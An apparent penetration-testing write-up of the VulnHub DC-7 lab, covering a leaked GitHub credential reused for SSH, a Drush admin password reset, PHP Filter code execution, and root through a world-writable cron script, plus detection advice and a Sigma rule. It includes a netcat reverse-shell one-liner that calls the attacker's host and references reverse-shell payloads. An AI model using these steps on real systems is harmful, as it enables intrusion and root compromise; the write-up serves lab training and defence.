---
title: "VulnHub DC-7: Drupal Drush Shell to Root via a www-data-Writable Cron Script"
attack: [T1595.001, T1190, T1552.001, T1078, T1059.004, T1053.003, T1068]
tools: [arp-scan, nmap, git, drush, netcat, msfvenom]
---

# VulnHub DC-7: Drupal Drush Shell to Root via a www-data-Writable Cron Script

## Objective

Full compromise of VulnHub's "DC: 7" boot2root VM, on an isolated VirtualBox host-only network
against my own Kali attack box. The box's own hint: brute forcing won't work — "think outside the
box, way outside the box."

## What I did

1. Host discovery and a full scan:
   ```
   arp-scan -l
   nmap -A dc7
   ```
   Two ports: 22/tcp (OpenSSH 7.4p1) and 80/tcp (Apache 2.4.25, Drupal 8). Added
   `192.168.56.119 dc7` to `/etc/hosts`.

2. The homepage repeated the "think outside the box" hint and credited a Twitter handle,
   `@DC7USER`, in the footer — a direct pointer to look outside the web app itself for the initial
   foothold rather than attacking Drupal directly.

3. The same handle's public GitHub account hosts a repository, `staffdb`, containing a set of PHP
   scripts for a staff database — including `config.php`, committed in plain text with a MySQL
   username and password for a `Staff` database on `localhost`.

4. That same password, reused, worked for SSH as the `dc7user` account on the box itself —
   confirming the credential-reuse pattern the box's hint was steering toward (GitHub
   reconnaissance, not brute forcing).

5. Basic enumeration as `dc7user`: a mail file (`mbox`) recorded a cron job running
   `/opt/scripts/backups.sh` as root, which performs a Drupal database dump via `drush` and GPG-
   encrypts it. `ls -la` also showed a `backups/` directory, confirming Drush (Drupal's CLI tool)
   is installed and configured for this site.

6. Drush's `user-password` command can reset **any** Drupal user's password without knowing the
   old one, as long as the invoking OS user has filesystem/database access to the Drupal
   install — which `dc7user` does:
   ```
   cd /var/www/html
   drush user-password admin --password=<new password>
   ```
   This reset the Drupal `admin` account's password directly from the command line.

7. Logged into Drupal's `/user/1` admin account with the new password. As an admin, enabled the
   core **PHP Filter** module (present but disabled by default) under **Extend**, which lets any
   content node execute embedded PHP when rendered with that text format.

8. Created a new **Basic page** node using the PHP Filter text format, embedding a PHP reverse-
   shell payload (the standard pentestmonkey `php-reverse-shell.php`, IP/port pointed at my Kali
   box) as the page body, and saved/viewed it to trigger execution.

9. Caught the shell as `www-data`. Rather than rely on a single fragile netcat session, pivoted to
   a `mkfifo`-based netcat bind using an `msfvenom`-generated raw payload
   (`cmd/unix/reverse_netcat`) for a more stable second shell.

10. Enumeration as `www-data` found `/opt/scripts/backups.sh` — **world-writable**, owned by root,
    and run by root via cron (confirmed by `cat /etc/crontab`, which runs `/etc/cron.hourly` and
    related jobs as root). Since `www-data` can write to this root-run script directly, appended a
    reverse-shell one-liner to it:
    ```
    echo "nc 192.168.56.102 7777 -e /bin/bash" >> /opt/scripts/backups.sh
    ```

11. Started a listener and waited for the next cron run. The script executed as root, firing the
    appended command and landing a root shell:
    ```
    nc -nvlp 7777
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```

12. Confirmed root: `cd /root && cat theflag.txt` — the box's own congratulations banner, no
    `flag{}`-style token to capture.

## What I found

- A publicly committed Git repository leaking plaintext database credentials for the application
  — and those same credentials were reused for the box's own SSH account, turning an OSINT find
  into direct shell access with no exploit required at all.
- Drush's `user-password` command meant SSH access to the host was equivalent to full Drupal admin
  access, with no need to touch Drupal's own authentication at all.
- Drupal's PHP Filter module, once enabled, is intentional authenticated RCE by design — the same
  pattern seen in other CMS "template editor" style features throughout this series.
- `/opt/scripts/backups.sh` was writable by the web server's own low-privilege account
  (`www-data`) while being executed by `cron` as root — a direct, no-exploit-needed path from a
  web shell to root, entirely down to an overly permissive file mode on a root-run script.

## How I found it

**Recon and the OSINT foothold**

![ARP scan of the host-only network](images/dc7/01.png)
![/etc/hosts entry for dc7](images/dc7/02.png)
![nmap -A against dc7 — SSH and Apache/Drupal 8](images/dc7/03.png)
![DC-7 homepage — "think outside the box" hint, @DC7USER credited](images/dc7/04.png)
![@DC7USER's public GitHub repo, staffdb](images/dc7/05.png)
![config.php committed to the repo with a plaintext DB credential](images/dc7/06.png)
![SSH login as dc7user, reusing the leaked credential](images/dc7/07.png)
![dc7user's home directory listing](images/dc7/08.png)
![dc7user's mbox — cron job running /opt/scripts/backups.sh as root](images/dc7/09.png)

**Drush password reset to Drupal admin RCE**

![cat of /opt/scripts/backups.sh — the drush dump/GPG-encrypt routine](images/dc7/10.png)
![Drush documentation confirming user-password can reset any account](images/dc7/11.png)
![resetting the Drupal admin password via drush from the SSH session](images/dc7/12.png)
![logged into Drupal as admin (/user/1)](images/dc7/13.png)
![Extend page — PHP Filter module present but disabled](images/dc7/14.png)
![downloading the php module release used to confirm filter behaviour](images/dc7/15.png)
![installing/enabling the module via the Install new module page](images/dc7/16.png)
![module installation confirmed successful](images/dc7/17.png)
![Extend page listing core modules, including the now-enabled filter](images/dc7/18.png)

**Shell, privilege escalation, root**

![Add content page, creating a Basic page node](images/dc7/19.png)
![the php-reverse-shell.php payload prepared, IP/port set to the Kali box](images/dc7/20.png)
![Kali terminal: sudo -i and netcat listener readied](images/dc7/21.png)
![shell caught as www-data after saving/viewing the malicious node](images/dc7/22.png)
![pivoting to a more stable mkfifo-based netcat bind shell](images/dc7/23.png)
![msfvenom generating a cmd/unix/reverse_netcat payload as a second option](images/dc7/24.png)
![catching the second shell, confirming /opt/scripts/backups.sh is root-owned but world-writable, and reading /etc/crontab](images/dc7/25.png)
![listener for the cron-triggered callback, appended command firing as root](images/dc7/26.png)
![root shell confirmed, flag file read](images/dc7/27.png)

## Detection

- **Credential reuse from public source control:** this specific root cause (a leaked credential
  in a public repo) isn't visible in the target's own logs at all — it's a supply-chain/OSINT
  exposure that only a secrets-scanning tool on the repository itself (or a pre-commit hook) would
  catch, before it ever reaches production.
- **Drush password reset:** `drush user-password` run from a shell session by an account that
  isn't the usual deploy/admin identity, especially shortly after an SSH login from an unfamiliar
  source, is a strong anomaly signal — shell history / auditd command logging on the web host
  catches this directly.
- **PHP Filter RCE:** a non-admin-initiated node save containing `<?php` tags, or the
  `php_filter` module itself being enabled outside a change window, are both detectable from
  Drupal's own watchdog log (`dblog`) or a file-integrity baseline on which modules are expected
  enabled.
- **Reverse shell spawn:** `www-data` spawning a shell or `msfvenom`-staged payload — the same
  process-tree signature as every other box in this series.
- **www-data-writable, root-run cron script:** the real underlying issue. A periodic audit of
  cron-invoked scripts' ownership *and* write permissions (anything root-run should never be
  group/other-writable) would have caught this before exploitation. At runtime: any modification
  to a cron-run script by a process running as the web server account, followed shortly after by
  that script spawning a shell as root on its next scheduled run, is unambiguous.

A minimal Sigma rule for the cron-script tamper:

```yaml
title: Web Server Account Modifying a Root-Run Cron Script
status: experimental
description: Detects a write to a script referenced by cron, made by a low-privilege web
    server account (e.g. www-data), which the script's next scheduled run would then execute
    as the cron job's own user (often root).
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|contains:
            - '/opt/scripts/'
            - '/etc/cron'
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/php-fpm'
            - '/apache2'
    condition: selection
falsepositives:
    - Legitimate deployment automation running as the web account (should be rare and allow-listed)
level: high
```

## Tools used

arp-scan, nmap, a public GitHub repository (OSINT, no tool beyond a browser), ssh, Drush, the
pentestmonkey `php-reverse-shell.php`, netcat, msfvenom.
